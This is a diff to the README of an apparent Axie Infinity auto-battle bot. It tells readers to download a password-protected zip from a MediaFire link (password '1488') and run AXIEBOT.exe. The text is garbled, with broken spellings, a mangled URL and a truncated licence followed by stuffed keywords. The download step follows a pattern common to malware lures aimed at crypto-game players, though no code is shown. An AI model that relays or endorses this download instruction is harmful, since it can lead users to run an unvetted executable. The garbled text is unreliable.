@@ -5,9 +5,9 @@ Bot uses WinAPI functions to take screenshots and recognize pixels of axie model
 Setup
 
 1.Change game resolution to full-screen (or full-scren windowed) and close Sk y avis game client
-2.Download archive with software https://www.mediafire.com/file/45lsw0mjspoadamAxieBot.zip/file Password:1488
+2.Download archive with software htts://www.mediafire.com/file/45lsw0mjspoadamAxieBot.zip/file Password:1488
 3.Launch AXIEBOT.exe with correct settings
 
-Im not recommend you to play morethan 24 hours per acoun. I m  no take resonsibility for any bans or blocks.
+Im not recommend you to play morethan 24 hours per aco un. I m  no take resonsibility for any bans or blocks.
 Copyrigh   
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANT F NY KIND, XRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR  PURPOSE AND NONINFRINGEMENT. I NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. AXIE INFIITY BOT, AXIE INFINITY AUTO BATTLE BOT, AXIE INFINITY SCRIPT
